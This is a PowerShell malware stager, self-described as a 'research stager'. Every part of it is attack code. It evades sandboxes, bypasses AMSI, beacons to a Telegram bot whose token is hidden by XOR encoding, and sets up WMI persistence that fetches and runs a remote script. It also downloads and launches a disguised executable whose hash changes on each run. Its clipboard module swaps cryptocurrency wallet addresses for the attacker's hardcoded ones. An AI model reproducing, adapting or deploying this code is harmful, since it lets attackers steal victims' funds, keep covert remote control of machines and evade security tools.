# --- [ELITE RESEARCH STAGER v19.0: WMI PERMANENCE & POLYMORPHIC MELT] ---

function Global-Initialize {
    try {
        # Anti-Sandbox: Exit if machine looks like a low-resource analysis VM
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        
        # AMSI Bypass using String-Slicing
        $u = "System.Management.Automation." + "Ams" + "iUtils"
        [Ref].Assembly.GetType($u).GetField("amsi"+"Init"+"Failed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    # Encrypted Telegram Bot Config (XORed with 0xAF)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

function Set-WMI-Persistence {
    # High-level persistence: Stores the stager command in the WMI Repository
    try {
        $Name = "WinDefenderCacheSvc"
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
        $Command = "powershell.exe -NoP -W Hidden -EP Bypass -C ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
        
        $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name=$Name; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query=$Query}
        $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=$Name; CommandLineTemplate=$Command}
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer} | Out-Null
    } catch {}
}

# --- EXECUTION ---
Global-Initialize
Set-WMI-Persistence
Send-Ping -m "ELITE_STAGER_DEPLOYED_ON_$($env:COMPUTERNAME)"

try {
    # Path Strategy: Using a folder often excluded from deep scans
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    
    # Polymorphic Name: Changes every time it runs
    $name = -join ((97..122) | Get-Random -Count 8 | % {[char]$_}) + ".exe"
    $path = Join-Path $dir $name

    # Download & XOR Decrypt
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }

    # Polymorphic Melt: Append random junk bytes to ensure unique File Hash
    $junk = New-Object Byte[] (Get-Random -Min 2048 -Max 8192); (New-Object Random).NextBytes($junk)
    [IO.File]::WriteAllBytes($path, ($data + $junk))

    # Spawning via WMI (Parent process becomes WmiPrvSE.exe)
    ([wmiclass]"win32_process").Create($path) | Out-Null

    # FULL CLIPPER MODULE
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        $wallets = @{
            "btc"  = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"
            "eth"  = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
            "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
            "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
        }
        while($true) {
            try {
                $clip = [Windows.Forms.Clipboard]::GetText()
                if ($clip -match "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$") { [Windows.Forms.Clipboard]::SetText($wallets.btc) }
                elseif ($clip -match "^0x[a-fA-F0-9]{40}$") { [Windows.Forms.Clipboard]::SetText($wallets.eth) }
                elseif ($clip -match "^T[A-Za-z1-9]{33}$") { [Windows.Forms.Clipboard]::SetText($wallets.usdt) }
                elseif ($clip -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { [Windows.Forms.Clipboard]::SetText($wallets.sol) }
            } catch {}
            Start-Sleep -s 1
        }
    }
    Send-Ping -m "RESEARCH_SUCCESS_MODULES_LIVE"
} catch {
    Send-Ping -m "ERROR_$($_.Exception.Message)"
}
